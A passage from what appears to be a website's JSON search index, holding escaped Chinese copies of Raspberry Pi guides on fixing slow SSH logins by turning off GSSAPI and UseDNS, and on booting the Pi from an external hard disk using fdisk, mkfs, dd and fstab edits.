\u6240\u4ee5\u4e3a\u4e86\u51cf\u5c11\u7b49\u5f85\u7684\u65f6\u95f4\uff0c\u6211\u4eec\u53ea\u9700\u8981\u628a\u6811\u8393\u6d3e\u7684gssapi\u8ba4\u8bc1\u5173\u95ed\u5373\u53ef\u3002 1\u3001\u5173\u95edssh\u7684gssapi\u8ba4\u8bc1 sudo nano /etc/ssh/ssh_config \u8fdb\u5165ssh_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u627e\u5230\u8fd9\u4e24\u884c\u8bbe\u7f6e\u5e76\u6ce8\u91ca\u6389\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a # GSSAPIAuthentication yes # GSSAPIDelegateCredentials no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 2\u3001 \u5173\u95edssh\u7684UseDNS sudo nano /etc/ssh/sshd_config \u8fdb\u5165sshd_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u52a0\u5165\u4ee5\u4e0b\u4ee3\u7801\uff1a UseDNS no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 3\u3001\u6700\u540e\u91cd\u542f\u6811\u8393\u6d3e\u5373\u53ef\uff1a sudo reboot 4\u3001\u6d4b\u8bd5 \u91cd\u65b0\u7528SSH\u8fde\u63a5\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u5f53\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u77ac\u95f4\u5c31\u4f1a\u5f39\u51fa\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/guanmaoning/article/details/80283012","title":"\u89e3\u51b3\u6811\u8393\u6d3eSSH\u767b\u5f55\u7f13\u6162\u7684\u95ee\u9898 Maoning Guan\u7684\u535a\u5ba2 CSDN\u535a\u5ba2"},{"location":"RPI/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2%E7%9A%84%E9%97%AE%E9%A2%98_Maoning%20Guan%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2/#ssh_maoning-guan-csdn","text":"\u7cfb\u7edf\uff1a \u6811\u8393\u6d3e\uff1a\u6811\u8393\u6d3e3\u4ee3B \u7cfb\u7edf\uff1araspbian \u95ee\u9898\uff1a \u6211\u4eec\u5728\u7528SSH\u767b\u5f55\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u5f80\u5f80\u9700\u8981\u7b49\u5f8510\u591a\u79d2\u751a\u81f320\u591a\u79d230\u79d2\u624d\u80fd\u5f39\u51fa\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\uff0c\u8fd9\u4e2a\u662f\u56e0\u4e3a\u6811\u8393\u6d3e\u5f00\u542f\u4e86gssapi\u8ba4\u8bc1\uff0cgsspi\u662f\u4e00\u79cd\u5de5\u4e1a\u6807\u51c6\u534f\u8bae\uff0c\u53ef\u7528\u4e8eSSH\u8fde\u63a5\u8ba4\u8bc1\u3002 \u89e3\u51b3\u65b9\u6cd5\uff1a \u6240\u4ee5\u4e3a\u4e86\u51cf\u5c11\u7b49\u5f85\u7684\u65f6\u95f4\uff0c\u6211\u4eec\u53ea\u9700\u8981\u628a\u6811\u8393\u6d3e\u7684gssapi\u8ba4\u8bc1\u5173\u95ed\u5373\u53ef\u3002 1\u3001\u5173\u95edssh\u7684gssapi\u8ba4\u8bc1 sudo nano /etc/ssh/ssh_config \u8fdb\u5165ssh_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u627e\u5230\u8fd9\u4e24\u884c\u8bbe\u7f6e\u5e76\u6ce8\u91ca\u6389\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a # GSSAPIAuthentication yes # GSSAPIDelegateCredentials no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 2\u3001 \u5173\u95edssh\u7684UseDNS sudo nano /etc/ssh/sshd_config \u8fdb\u5165sshd_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u52a0\u5165\u4ee5\u4e0b\u4ee3\u7801\uff1a UseDNS no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 3\u3001\u6700\u540e\u91cd\u542f\u6811\u8393\u6d3e\u5373\u53ef\uff1a sudo reboot 4\u3001\u6d4b\u8bd5 \u91cd\u65b0\u7528SSH\u8fde\u63a5\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u5f53\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u77ac\u95f4\u5c31\u4f1a\u5f39\u51fa\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/guanmaoning/article/details/80283012","title":"\u89e3\u51b3\u6811\u8393\u6d3eSSH\u767b\u5f55\u7f13\u6162\u7684\u95ee\u9898_Maoning Guan\u7684\u535a\u5ba2-CSDN\u535a\u5ba2"},{"location":"RPI/%E8%AE%BE%E7%BD%AE%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8/","text":"\u8bbe\u7f6e\u6811\u8393\u6d3e\u4f7f\u7528\u5916\u7f6e\u786c\u76d8\u542f\u52a8 \u6574\u4ef6\u4e8b\u60c5\u662f\u8fd9\u6837\u7684\uff1a\u67d0\u4e00\u5929\u6211\u5c1d\u8bd5\u5728\u6811\u8393\u6d3e\u4e0a\u5b89\u88c5\u4e00\u4e2a vim \u7684\u7f16\u8f91\u5668\u63d2\u4ef6 YouCompleteMe \uff0c\u9700\u8981\u4ece\u6e90\u7801\u7f16\u8bd1\u3002\u7f16\u8bd1\u8fd9\u4e2a\u6bd4\u8f83\u8017\u8d39\u5185\u5b58\uff0c\u53ef\u80fd\u6211\u5206\u914d\u7684 SWAP \u4e0d\u591f\u5927\uff081024MB\uff09\uff0c\u5bfc\u81f4\u5185\u5b58\u4e0d\u8db3\uff0c\u7136\u540e sshd \u5c31\u6302\u4e86\u3002\u55ef\uff0c\u5e76\u4e14\u5df2\u7ecf\u8fc7\u53bb\u4e86\u4e00\u4e2a\u5c0f\u65f6\u6211\u4e5f\u6ca1\u6cd5\u8fde\u63a5\u4e0a\u53bb\u3002\u4e8e\u662f\u6211\u5c31\u62d4\u7535\u6e90\u91cd\u542f\u4e86\uff0c\u8fd9\u4e0b\u53ef\u597d\uff0cSD \u5361\u5f7b\u5e95\u542f\u52a8\u4e0d\u4e86\u4e86\uff0c\u4f30\u8ba1\u662f\u6587\u4ef6\u7cfb\u7edf\u635f\u574f\u4e4b\u7c7b\u7684\u3002\u4e0a\u7f51\u641c\u4e86\u4e00\u4e0b\u8fd9\u79cd\u73b0\u8c61\u4f3c\u4e4e\u975e\u5e38\u5e38\u89c1\uff0c\u53ea\u8981\u5728\u65ad\u7535\u65f6 SD \u5361\u8fd8\u5728\u5199\u5165\u5c31\u53ef\u80fd\u51fa\u73b0\u3002\u4e8e\u662f\u6211\u5c31\u60f3\u5230\u8981\u628a\u7cfb\u7edf\u88c5\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\u3002 \u9996\u5148\u786c\u4ef6\u914d\u7f6e\u662f\u8fd9\u6837\u7684\uff1a\u6211\u624b\u4e0a\u6709 8GB \u548c 16GB \u7684 C10 SD \u5361\u5404\u4e00\u5f20\uff0c500GB \u7684\u79fb\u52a8\u786c\u76d8\u4e00\u4e2a\uff08\u4e4b\u524d\u7b14\u8bb0\u672c\u7684\u673a\u68b0\u786c\u76d8\uff0c\u6362 SSD \u7684\u65f6\u5019\u62c6\u4e0b\u6765\u88c5\u5728\u79fb\u52a8\u786c\u76d8\u76d2\u91cc\uff09\uff0c\u6709\u6e90 USB Hub \u4e00\u4e2a\uff0c\u6811\u8393\u6d3e\u4e00\u4e2a\u3002\u5176\u4e2d\u79fb\u52a8\u786c\u76d8\u4e0a\u6709\u4e24\u4e2a NTFS \u5206\u533a\uff08Windows \u7684 C\u76d8\u548c D\u76d8\uff09\u548c\u4e00\u4e2a ext4 \u5206\u533a\uff08\u5f88\u4e45\u4ee5\u524d\u7684 Ubuntu \u7cfb\u7edf\uff0c\u6240\u6709\u6570\u636e\u90fd\u5728\u91cc\u9762\uff09\u3002 \u6211\u60f3\u5b9e\u73b0\u7684\u6548\u679c\u662f\u8fd9\u6837\u7684\uff1a\u6e05\u7a7a\u65e7\u7684 Windows C\u76d8\uff0890GB\uff09\uff0c\u5206\u51fa 30GB \u7ed9 Raspbian\uff0c\u7136\u540e\u6811\u8393\u6d3e\u8981\u4ece\u786c\u76d8\u542f\u52a8\u3002 \u7b80\u5355\u641c\u7d22\u4e86\u4e00\u4e0b\u53d1\u73b0\u76f4\u63a5\u4ece\u786c\u76d8\u542f\u52a8\u662f\u4e0d\u884c\u7684\uff0c\u56e0\u4e3a\u6811\u8393\u6d3e\u542f\u52a8\u7684\u65f6\u5019\u56fa\u5b9a\u662f\u4ece SD \u5361\u7684\u7b2c\u4e00\u4e2a\u5206\u533a\uff08/boot\uff09\u8bfb\u53d6 config.txt \u3001 cmdline.txt \u548c kernel.img \u8fd9\u4e09\u4e2a\u6587\u4ef6\u3002\u4f46\u662f\u9664\u6b64\u4e4b\u5916\uff0c\u5404\u4e2a\u5916\u63a5\u8bbe\u5907\u7684\u6302\u8f7d\u70b9\u5219\u662f\u6ca1\u6709\u9650\u5236\u7684\u3002\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5c06 /boot \u5206\u533a\u653e\u5728 SD \u5361\u4e0a\uff0c\u5e76\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\u7684\uff0c\u907f\u514d\u610f\u5916\u5173\u673a\u65f6\u635f\u574f\u4e0a\u9762\u7684\u6587\u4ef6\u7cfb\u7edf\uff1b\u540c\u65f6\u6211\u4eec\u628a\u7cfb\u7edf\u7684\u5176\u4ed6\u90e8\u5206\u90fd\u653e\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\uff0c\u901a\u8fc7 USB \u8fde\u63a5\u5230\u6811\u8393\u6d3e\uff0c\u8fd9\u90e8\u5206\u662f\u53ef\u8bfb\u5199\u7684\u3002 \u6211\u4eec\u9996\u5148\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\uff0c\u4ece\u6811\u8393\u6d3e\u7684\u7f51\u7ad9\u4e0a \u4e0b\u8f7d Raspbian \u955c\u50cf\uff0c\u6309\u7167 \u5b98\u65b9\u7684\u6307\u5bfc \uff0c\u5b89\u88c5\u5230 SD \u5361\u4e0a\u3002\u8fd9\u91cc\u7b80\u8981\u8bf4\u4e00\u4e0b\u5728 Mac OS X \u4e0a\u7684\u5b89\u88c5\u65b9\u5f0f\uff1a # \u9996\u5148\u5c06 SD \u5361\u63d2\u5165\u9002\u914d\u5668\uff0c\u8fde\u63a5\u5230 Mac # \u6253\u5f00\u7ec8\u7aef # \u5728\u5217\u51fa\u7684\u78c1\u76d8\u4e2d\u627e\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907\uff0c\u4f8b\u5982 /dev/disk4 diskutil list # unmount diskutil unmountDisk /dev/disk4 # \u8fd9\u91cc\u66ff\u6362\u6210\u4f60\u7684 SD \u5361\u8bbe\u5907 # \u627e\u5230\u4f60\u4e0b\u8f7d\u7684\u955c\u50cf\uff08\u89e3\u538b\u7684 .img \u6587\u4ef6\uff09\uff0c\u5199\u5165\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907 sudo dd bs=1m if=image.img of=/dev/rdisk4 # \u8fd9\u91cc\u6ce8\u610f\u662f rdisk # \u5199\u5165\u5b8c\u6210\u540e\u4ece Finder \u91cc\u5f39\u51fa SD \u5361\u5c31\u597d\u4e86 \u7136\u540e\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\u8fdb\u884c\u7b2c\u4e00\u6b21\u542f\u52a8\uff0c\u4e5f\u53ef\u4ee5\u505a\u4e00\u4e9b\u7b80\u5355\u8bbe\u7f6e\u7684\u8c03\u6574\u3002\u6211\u662f\u63a5\u4e86\u952e\u76d8\u548c\u663e\u793a\u5668\u542f\u52a8\u7684\uff0c\u8fdb\u53bb\u540e\u9996\u5148\u6253\u5f00 raspi-config \u628a\u56fe\u5f62\u754c\u9762\u5173\u6389\u4e86\uff0c\u7136\u540e\u6253\u5f00\u4e86\u6444\u50cf\u5934\u3001I2C \u548c SPI \u8bbe\u5907\uff0c\u7136\u540e\u6211\u5c31\u91cd\u542f\u4e86\u3002\u63a5\u4e0b\u6765\u6211\u90fd\u662f\u901a\u8fc7 ssh \u8fdb\u884c\u7684\u64cd\u4f5c\u3002 \u901a\u8fc7 USB \u8fde\u63a5\u79fb\u52a8\u786c\u76d8\u3002 sudo fdisk -l \u770b\u4e00\u4e0b\u662f\u54ea\u4e2a\u8bbe\u5907\uff0c\u4e00\u822c\u90fd\u662f /dev/sda \u4e4b\u7c7b\u7684\u3002 \u5982\u679c\u6709\u4e0d\u60f3\u8981\u7684\u5206\u533a\u9700\u8981\u5220\u6389\u817e\u51fa\u7a7a\u95f4\u7684\u8bdd\uff0c sudo fdisk /dev/sda \u6253\u5f00 fdisk \u5de5\u5177\uff0c\u628a\u4e0d\u8981\u7684\u5206\u533a\u5220\u6389\uff0c\u65b0\u5efa\u4e00\u4e2a 30GB \u5206\u533a\u3002\u5177\u4f53\u600e\u4e48\u64cd\u4f5c\uff0c\u4ea4\u4e92\u6a21\u5f0f\u4e0b\u6709\u5e2e\u52a9\uff0c\u6ce8\u610f\u4e0d\u8981\u5220\u6389\u4e86\u60f3\u4fdd\u7559\u7684\u5206\u533a\u5373\u53ef\u3002\u5728\u4f60\u8f93\u5165 w \u547d\u4ee4\u6267\u884c\u5199\u5165\u4e4b\u524d\uff0c\u6240\u6709\u6539\u52a8\u90fd\u662f\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u4f60\u89c9\u5f97\u6709\u95ee\u9898\u7684\u8bdd\uff0c Ctrl-C \u9000\u51fa\u91cd\u6765\u5c31\u597d\u3002 \u521b\u5efa\u597d\u5206\u533a\u4e4b\u540e\u683c\u5f0f\u5316\u6210 ext4\uff1a sudo mkfs.ext4 /dev/sda1 \u3002 \u8fd0\u884c sudo gdisk /dev/sda \u8fdb\u5165 gdisk \u5de5\u5177\u7684\u4ea4\u4e92\u6a21\u5f0f\u3002\u5728\u8fd9\u91cc\u68c0\u89c6\u4e00\u4e0b\u4f60\u60f3\u7528\u4e8e Raspbian \u7684\u5206\u533a\uff0c\u83b7\u53d6\u5230 UUID\u3002\u4ee5\u4e0b\u4f8b\u5b50\u6765\u81ea Stefan\u2019s Blog root@raspberrypi:/home/pi# gdisk /dev/sda GPT fdisk (gdisk) version 0.8.5 Partition table scan: MBR: hybrid BSD: not present APM: not present GPT: present Found valid GPT with hybrid MBR; using GPT. Command (? for help): i Partition number (1-3): 2 Partition GUID code: 0FC63DAF-8483-4772-8E79-3D69D8477DE4 (Linux filesystem) Partition unique GUID: 176ADF0D-357D-4C4B-ADC0-371342F444AB First sector: 2099200 (at 1.0 GiB) Last sector: 23070719 (at 11.0 GiB) Partition size: 20971520 sectors (10.0 GiB) Attribute flags: 0000000000000000 Partition name: '' Command (? for help): q UUID \u662f\u8ddf\u5728 \u201cPartition unique GUID\u201d \u540e\u9762\u90a3\u4e32\u5b57\u6bcd\uff0c\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u4e5f\u5c31\u662f 176ADF0D-357D-4C4B-ADC0-371342F444AB \u3002 \u63a5\u4e0b\u6765\u7f16\u8f91 /boot/cmdline.txt \uff0c\u5c06\u5176\u4e2d root=/dev/mmcblk0p2 \u6539\u4e3a root=PARTUUID=\u5206\u533a\u7684UUID \u7136\u540e\u4fdd\u5b58\u3002 \u968f\u540e\uff0c\u7f16\u8f91 /etc/fstab \u5c06 /boot \u6302\u8f7d\u4e3a\u53ea\u8bfb\u6a21\u5f0f\uff0c\u5c06\u79fb\u52a8\u786c\u76d8\u4e5f\u6dfb\u52a0\u8fdb\u53bb\uff0c\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u3002\u9ed8\u8ba4\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u7684\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat defaults 0 2 /dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u66f4\u6539\u4e4b\u540e\u5185\u5bb9\u5927\u6982\u50cf\u8fd9\u6837\uff1a proc /proc proc defaults 0 0 /dev/mmcblk0p1 /boot vfat ro 0 2 /dev/sda1 / ext4 defaults,errors=remount-ro 0 1 #/dev/mmcblk0p2 / ext4 defaults,noatime 0 1 # a swapfile is not a swap partition, no line here # use dphys-swapfile swap[on|off] for that \u6700\u540e\uff0c\u5c06 / \u4e0b\u7684\u5185\u5bb9\u5168\u90e8\u5199\u5165\u5230\u79fb\u52a8\u786c\u76d8\u4e2d\u3002\u4ee5\u6211\u81ea\u5df1\u7684\u914d\u7f6e\u4e3a\u4f8b\uff0c\u4f7f\u7528 /dev/sda1 \u5206\u533a\uff1a dd if=/dev/mmcblk0p2 of=/dev/sda1 \u56e0\u4e3a Raspbian \u9ed8\u8ba4\u662f\u5c06 SD \u5361\u7684\u7b2c\u4e8c\u4e2a\u5206\u533a\uff08\u4e5f\u5c31\u662f /dev/mmcblk0p2 \uff09\u6302\u8f7d\u5230 / \u7684\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u4ece\u8fd9\u4e2a\u5206\u533a\u8bfb\u53d6\uff0c\u5199\u5165\u5230\u76ee\u6807\u5206\u533a\u5c31\u53ef\u4ee5\u3002 \u5199\u5165\u5b8c\u6210\u4e4b\u540e\uff0c /dev/sda1 \u7684\u5927\u5c0f\u4e0e /dev/mmcblk0p2 \u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u4f1a\u8fdc\u8fdc\u5c0f\u4e8e\u4f60\u521b\u5efa\u8fd9\u4e2a\u5206\u533a\u65f6\u6307\u5b9a\u7684\u5927\u5c0f\u3002\u53ef\u4ee5\u4f7f\u7528 sudo resize2fs /dev/sda1 \u6765\u5c55\u5f00\u5230\u5b8c\u6574\u7684\u5927\u5c0f\u3002 \u63a5\u4e0b\u6765\u91cd\u542f\u5c31\u597d\u4e86\u3002 \u5728\u8fc7\u7a0b\u4e2d\u5982\u679c\u4e0d\u614e\u4fee\u6539\u9519\u4e86\u53c2\u6570\uff0c\u6216\u8005\u5c06\u4e0d\u6b63\u786e\u7684\u5206\u533a\u6302\u8f7d\u4e3a\u53ea\u8bfb\u4e86\uff0c\u4e0d\u5fc5\u60ca\u614c\uff0c\u4e5f\u4e0d\u9700\u8981\u9a6c\u4e0a\u91cd\u88c5\u7cfb\u7edf\u3002\u53ea\u8981\u5c06\u6811\u8393\u6d3e\u65ad\u7535\uff0cSD \u5361\u62d4\u51fa\u6765\u8fde\u63a5\u5230\u522b\u7684\u7535\u8111\u4e0a\uff0c\u4fee\u6539 /boot/cmdline.txt \u91cc\u7684\u53c2\u6570\uff0c\u6539\u4e3a\u9ed8\u8ba4\u7684\u6302\u8f7d SD \u5361\u7b2c\u4e8c\u5206\u533a\u5373\u53ef\u3002\u91cd\u542f\u540e\u53ef\u4ee5\u901a\u8fc7 sudo mount -o remount,rw /dev/sda1 \u5c06 /etc/fstab \u4e2d\u6307\u5b9a\u7684\u5206\u533a\u91cd\u65b0\u6302\u8f7d\u4e3a\u53ef\u8bfb\u5199\u6a21\u5f0f\u6765\u8fdb\u884c\u4fee\u6539\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.mynook.info/post/boot-raspberrypi-from-external-hdd/","title":"\u8bbe\u7f6e\u6811\u8393\u6d3e\u4f7f\u7528\u5916\u7f6e\u786c\u76d8\u542f\u52a8"},{"location":"RPI/%E8%AE%BE%E7%BD%AE%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8/#_1","text":"\u6574\u4ef6\u4e8b\u60c5\u662f\u8fd9\u6837\u7684\uff1a\u67d0\u4e00\u5929\u6211\u5c1d\u8bd5\u5728\u6811\u8393\u6d3e\u4e0a\u5b89\u88c5\u4e00\u4e2a vim \u7684\u7f16\u8f91\u5668\u63d2\u4ef6 YouCompleteMe \uff0c\u9700\u8981\u4ece\u6e90\u7801\u7f16\u8bd1\u3002\u7f16\u8bd1\u8fd9\u4e2a\u6bd4\u8f83\u8017\u8d39\u5185\u5b58\uff0c\u53ef\u80fd\u6211\u5206\u914d\u7684 SWAP \u4e0d\u591f\u5927\uff081024MB\uff09\uff0c\u5bfc\u81f4\u5185\u5b58\u4e0d\u8db3\uff0c\u7136\u540e sshd \u5c31\u6302\u4e86\u3002\u55ef\uff0c\u5e76\u4e14\u5df2\u7ecf\u8fc7\u53bb\u4e86\u4e00\u4e2a\u5c0f\u65f6\u6211\u4e5f\u6ca1\u6cd5\u8fde\u63a5\u4e0a\u53bb\u3002\u4e8e\u662f\u6211\u5c31\u62d4\u7535\u6e90\u91cd\u542f\u4e86\uff0c\u8fd9\u4e0b\u53ef\u597d\uff0cSD \u5361\u5f7b\u5e95\u542f\u52a8\u4e0d\u4e86\u4e86\uff0c\u4f30\u8ba1\u662f\u6587\u4ef6\u7cfb\u7edf\u635f\u574f\u4e4b\u7c7b\u7684\u3002\u4e0a\u7f51\u641c\u4e86\u4e00\u4e0b\u8fd9\u79cd\u73b0\u8c61\u4f3c\u4e4e\u975e\u5e38\u5e38\u89c1\uff0c\u53ea\u8981\u5728\u65ad\u7535\u65f6 SD \u5361\u8fd8\u5728\u5199\u5165\u5c31\u53ef\u80fd\u51fa\u73b0\u3002\u4e8e\u662f\u6211\u5c31\u60f3\u5230\u8981\u628a\u7cfb\u7edf\u88c5\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\u3002 \u9996\u5148\u786c\u4ef6\u914d\u7f6e\u662f\u8fd9\u6837\u7684\uff1a\u6211\u624b\u4e0a\u6709 8GB \u548c 16GB \u7684 C10 SD \u5361\u5404\u4e00\u5f20\uff0c500GB \u7684\u79fb\u52a8\u786c\u76d8\u4e00\u4e2a\uff08\u4e4b\u524d\u7b14\u8bb0\u672c\u7684\u673a\u68b0\u786c\u76d8\uff0c\u6362 SSD \u7684\u65f6\u5019\u62c6\u4e0b\u6765\u88c5\u5728\u79fb\u52a8\u786c\u76d8\u76d2\u91cc\uff09\uff0c\u6709\u6e90 USB Hub \u4e00\u4e2a\uff0c\u6811\u8393\u6d3e\u4e00\u4e2a\u3002\u5176\u4e2d\u79fb\u52a8\u786c\u76d8\u4e0a\u6709\u4e24\u4e2a NTFS \u5206\u533a\uff08Windows \u7684 C\u76d8\u548c D\u76d8\uff09\u548c\u4e00\u4e2a ext4 \u5206\u533a\uff08\u5f88\u4e45\u4ee5\u524d\u7684 Ubuntu \u7cfb\u7edf\uff0c\u6240\u6709\u6570\u636e\u90fd\u5728\u91cc\u9762\uff09\u3002 \u6211\u60f3\u5b9e\u73b0\u7684\u6548\u679c\u662f\u8fd9\u6837\u7684\uff1a\u6e05\u7a7a\u65e7\u7684 Windows C\u76d8\uff0890GB\uff09\uff0c\u5206\u51fa 30GB \u7ed9 Raspbian\uff0c\u7136\u540e\u6811\u8393\u6d3e\u8981\u4ece\u786c\u76d8\u542f\u52a8\u3002 \u7b80\u5355\u641c\u7d22\u4e86\u4e00\u4e0b\u53d1\u73b0\u76f4\u63a5\u4ece\u786c\u76d8\u542f\u52a8\u662f\u4e0d\u884c\u7684\uff0c\u56e0\u4e3a\u6811\u8393\u6d3e\u542f\u52a8\u7684\u65f6\u5019\u56fa\u5b9a\u662f\u4ece SD \u5361\u7684\u7b2c\u4e00\u4e2a\u5206\u533a\uff08/boot\uff09\u8bfb\u53d6 config.txt \u3001 cmdline.txt \u548c kernel.img \u8fd9\u4e09\u4e2a\u6587\u4ef6\u3002\u4f46\u662f\u9664\u6b64\u4e4b\u5916\uff0c\u5404\u4e2a\u5916\u63a5\u8bbe\u5907\u7684\u6302\u8f7d\u70b9\u5219\u662f\u6ca1\u6709\u9650\u5236\u7684\u3002\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5c06 /boot \u5206\u533a\u653e\u5728 SD \u5361\u4e0a\uff0c\u5e76\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\u7684\uff0c\u907f\u514d\u610f\u5916\u5173\u673a\u65f6\u635f\u574f\u4e0a\u9762\u7684\u6587\u4ef6\u7cfb\u7edf\uff1b\u540c\u65f6\u6211\u4eec\u628a\u7cfb\u7edf\u7684\u5176\u4ed6\u90e8\u5206\u90fd\u653e\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\uff0c\u901a\u8fc7 USB \u8fde\u63a5\u5230\u6811\u8393\u6d3e\uff0c\u8fd9\u90e8\u5206\u662f\u53ef\u8bfb\u5199\u7684\u3002 \u6211\u4eec\u9996\u5148\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\uff0c\u4ece\u6811\u8393\u6d3e\u7684\u7f51\u7ad9\u4e0a \u4e0b\u8f7d Raspbian \u955c\u50cf\uff0c\u6309\u7167 \u5b98\u65b9\u7684\u6307\u5bfc \uff0c\u5b89\u88c5\u5230 SD \u5361\u4e0a\u3002\u8fd9\u91cc\u7b80\u8981\u8bf4\u4e00\u4e0b\u5728 Mac OS X \u4e0a\u7684\u5b89\u88c5\u65b9\u5f0f\uff1a # \u9996\u5148\u5c06 SD \u5361\u63d2\u5165\u9002\u914d\u5668\uff0c\u8fde\u63a5\u5230 Mac # \u6253\u5f00\u7ec8\u7aef # \u5728\u5217\u51fa\u7684\u78c1\u76d8\u4e2d\u627e\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907\uff0c\u4f8b\u5982 /dev/disk4 diskutil list # unmount diskutil unmountDisk /dev/disk4 # \u8fd9\u91cc\u66ff\u6362\u6210\u4f60\u7684 SD \u5361\u8bbe\u5907 # \u627e\u5230\u4f60\u4e0b\u8f7d\u7684\u955c\u50cf\uff08\u89e3\u538b\u7684 .img \u6587\u4ef6\uff09\uff0c\u5199\u5165\u5230\u4f60\u7684 SD \u5361\u8bbe\u5907 sudo dd bs=1m if=image.img of=/dev/rdisk4 # \u8fd9\u91cc\u6ce8\u610f\u662f rdisk # \u5199\u5165\u5b8c\u6210\u540e\u4ece Finder \u91cc\u5f39\u51fa SD \u5361\u5c31\u597d\u4e86 \u7136\u540e\u6309\u7167\u6b63\u5e38\u65b9\u5f0f\u8fdb\u884c\u7b2c\u4e00\u6b21\u542f\u52a8\uff0c\u4e5f\u53ef\u4ee5\u505a\u4e00\u4e9b\u7b80\u5355\u8bbe\u7f6e\u7684\u8c03\u6574\u3002\u6211\u662f\u63a5\u4e86\u952e\u76d8\u548c\u663e\u793a\u5668\u542f\u52a8\u7684\uff0c\u8fdb\u53bb\u540e\u9996\u5148\u6253\u5f00 raspi-config \u628a\u56fe\u5f62\u754c\u9762\u5173\u6389\u4e86\uff0c\u7136\u540e\u6253\u5f00\u4e86\u6444\u50cf\u5934\u3001I2C \u548c SPI \u8bbe\u5907\uff0c\u7136\u540e\u6211\u5c31\u91cd\u542f\u4e86\u3002\u63a5\u4e0b\u6765\u6211\u90fd\u662f\u901a\u8fc7 ssh \u8fdb\u884c\u7684\u64cd\u4f5c\u3002 \u901a\u8fc7 USB \u8fde\u63a5\u79fb\u52a8\u786c\u76d8\u3002 sudo fdisk -l \u770b\u4e00\u4e0b\u662f\u54ea\u4e2a\u8bbe\u5907\uff0c\u4e00\u822c\u90fd\u662f /dev/sda \u4e4b\u7c7b\u7684\u3002 \u5982\u679c\u6709\u4e0d\u60f3\u8981\u7684\u5206\u533a\u9700\u8981\u5220\u6389\u817e\u51fa\u7a7a\u95f4\u7684\u8bdd\uff0c sudo fdisk /dev/sda \u6253\u5f00 fdisk \u5de5\u5177\uff0c\u628a\u4e0d\u8981\u7684\u5206\u533a\u5220\u6389\uff0c\u65b0\u5efa\u4e00\u4e2a 30GB \u5206\u533a\u3002\u5177\u4f53\u600e\u4e48\u64cd\u4f5c\uff0c\u4ea4\u4e92\u6a21\u5f0f\u4e0b\u6709\u5e2e\u52a9\uff0c\u6ce8\u610f\u4e0d\u8981\u5220\u6389\u4e86\u60f3\u4fdd\u7559\u7684\u5206\u533a\u5373\u53ef\u3002\u5728\u4f60\u8f93\u5165 w 